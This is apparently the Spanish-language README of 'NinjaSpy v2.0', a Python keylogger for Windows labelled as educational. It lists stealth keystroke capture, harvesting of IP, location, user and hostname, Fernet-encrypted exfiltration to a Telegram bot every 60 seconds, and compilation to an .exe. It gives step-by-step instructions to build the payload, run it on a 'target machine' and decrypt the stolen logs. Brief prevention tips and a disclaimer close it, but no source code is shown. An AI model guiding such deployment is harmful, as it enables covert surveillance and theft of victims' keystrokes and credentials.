
# NinjaSpy v2.0 | Keylogger Avanzado 🔐🕵️

NinjaSpy es una herramienta de keylogging avanzada desarrollada en Python con fines educativos y de concientización en ciberseguridad. Esta nueva versión sustituye el envío por correo tradicional por cifrado y exfiltración vía Telegram, incorporando buenas prácticas como el uso de entornos virtuales, cifrado con Fernet y compatibilidad con ejecutables.

> **Propósito:** Educativo – análisis y demostración de técnicas ofensivas de ciberseguridad

---

## 🆚 Comparativa de versiones

| Función                           | Versión Antigua | Versión 2.0 (Actual) ✅ |
|----------------------------------|------------------|-------------------------|
| Captura de teclas                | ✅               | ✅                      |
| Envío por correo (SMTP)          | ✅               | ❌                      |
| Envío por Telegram               | ❌               | ✅                      |
| Cifrado Fernet                   | ❌               | ✅                      |
| IP, ciudad, host, usuario        | ❌               | ✅                      |
| Compilación a `.exe`             | ❌               | ✅                      |
| Registro en `%APPDATA%`          | ❌               | ✅                      |
| Soporte para desencriptar logs   | ❌               | ✅                      |
| Persistencia/Auto ejecución      | ❌               | ⚠️ *(No incluida aún)*  |

---

## 🚀 Características

- Captura silenciosa de pulsaciones del teclado (keylogger).
- Guarda registros en `%APPDATA%\NinjaSpy\log.txt`.
- Cifra el archivo de log usando Fernet.
- Recolecta IP pública, ciudad, usuario y hostname.
- Envía logs cifrados a través de un bot de Telegram.
- Constructor interactivo con opción de compilación `.exe`.
- Herramienta para desencriptar logs recuperados.

---

## 🧰 Requisitos

- Python 3.10 o superior
- Telegram Bot Token
- Chat ID (tu usuario o grupo en Telegram)
- Sistema operativo Windows

---

## 🛠 Instalación

1. Clona el repositorio o extrae el `.zip`:
    ```bash
    git clone https://github.com/tanoriruizs/NinjaSpy.git
    cd NinjaSpy
    ```

2. Crea un entorno virtual:
    ```bash
    python -m venv venv
    ```

3. Activa el entorno:
    ```bash
    venv\Scripts\activate
    ```

4. Instala las dependencias:
    ```bash
    pip install -r requirements.txt
    ```

---

## ⚙️ Configuración y Uso

### 1. Crear el Payload

Ejecuta el builder interactivo para generar el keylogger y compilar el `.exe`:

```bash
python builder.py
```

- Introduce tu `TOKEN` de Telegram.
- Proporciona tu `CHAT_ID` (puedes usar [@userinfobot](https://t.me/userinfobot) para obtenerlo).
- Opcionalmente define un nombre para el ejecutable final.

Se generará:

- `NinjaSpy.py` con tu configuración.
- `NinjaSpy.exe` en el directorio `dist/`.
- Una **clave Fernet** para desencriptar logs (¡guárdala!).

---

### 2. Ejecutar el Payload

Ejecuta el `.exe` en la máquina objetivo. Se ejecuta en segundo plano y cada 60 segundos:

- Recolecta datos del sistema.
- Cifra el registro del teclado.
- Envía el log `.enc` a tu bot de Telegram.

---

## 🔓 Desencriptar Logs

Para recuperar el contenido de un log cifrado recibido:

```bash
python builder.py
```

Selecciona la opción de desencriptar e ingresa:

- Ruta del archivo `.enc` descargado de Telegram.
- Clave Fernet generada al construir el payload.
- Nombre del archivo de salida (por ejemplo, `log.txt`).

---

## 🛡️ Prevención contra Keyloggers

1. **Mantén tu software actualizado:** Las actualizaciones corrigen vulnerabilidades explotables por keyloggers.
2. **Utiliza un antivirus confiable:** Con escaneo heurístico y en tiempo real.
3. **No ejecutes archivos desconocidos:** Revisa el origen de los `.exe` que usas.
4. **Habilita autenticación multifactor:** Añade una capa adicional de seguridad.
5. **Monitorea procesos sospechosos:** Usa herramientas como Process Explorer o Task Manager avanzado.

---

## ⚠️ Disclaimer

Este proyecto es únicamente con fines **educativos y éticos**.  
**El autor no se responsabiliza** por el uso indebido de este software.  
NinjaSpy fue creado para aprender sobre seguridad informática, y **no debe utilizarse con fines maliciosos ni sin el consentimiento de terceros.**

---


